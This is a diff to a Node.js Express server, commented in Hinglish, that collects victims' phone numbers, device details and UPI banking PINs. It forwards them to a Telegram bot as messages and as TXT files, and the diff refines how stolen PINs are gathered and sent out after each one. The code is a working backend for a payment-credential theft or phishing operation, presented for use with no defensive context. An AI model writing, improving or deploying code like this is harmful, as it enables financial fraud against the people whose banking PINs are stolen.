@@ -2,7 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const FormData = require('form-data'); // File bhejne ke liye
+const FormData = require('form-data');
 
 const app = express();
 app.use(cors());
@@ -49,7 +49,9 @@ const sendFileToTelegram = async (content, filename) => {
     try {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('document', Buffer.from(content, 'utf-8'), { filename: `${filename}.txt` });
+        // File content se markdown stars (*) hata diye gaye hain
+        const cleanContent = content.replace(/\*/g, '');
+        form.append('document', Buffer.from(cleanContent, 'utf-8'), { filename: `${filename}.txt` });
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
@@ -70,30 +72,29 @@ const startupNotification = async () => {
 app.post('/send-data', async (req, res) => {
     const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
     
-    let updatedText = "";
-
-    // Device Model extract karna (RMX3933)
+    // Model name extract (RMX3933)
     if (deviceId) {
         currentDeviceModel = deviceId.split(' ')[0] || "Device";
     }
 
     if (type === 'NUMBER') {
         lastMessageId = null; 
-        updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
-        updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
-        updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
-        updatedText += `*Number:* +91 ${number}\n`;
-    } else if (pin) {
-        updatedText = currentMessageText + `*UPI PIN:* ${pin}\n`;
-    }
-
-    if (updatedText) {
-        await sendOrUpdateTelegram(updatedText);
+        currentMessageText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
+        currentMessageText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
+        currentMessageText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
+        currentMessageText += `*Number:* +91 ${number}\n`;
         
-        // Har update ke baad TXT file bhi bhejega (Latest data ke saath)
-        // Agar aap chahte hain ki sirf PIN milne par file aaye, toh condition change kar sakte hain
-        const fileContent = updatedText.replace(/\*/g, ''); // Bold stars hata kar clean text file ke liye
-        await sendFileToTelegram(fileContent, currentDeviceModel);
+        await sendOrUpdateTelegram(currentMessageText);
+    } else if (pin) {
+        // Naya PIN existing text mein jodo
+        currentMessageText += `*UPI PIN:* ${pin}\n`;
+        
+        // Message edit karo
+        await sendOrUpdateTelegram(currentMessageText);
+        
+        // Final details milne ke baad TXT file bhejo
+        // Note: Ye har PIN ke baad file bhejega taaki aapke paas hamesha latest log file rahe
+        await sendFileToTelegram(currentMessageText, currentDeviceModel);
     }
     
     res.status(200).json({ success: true });
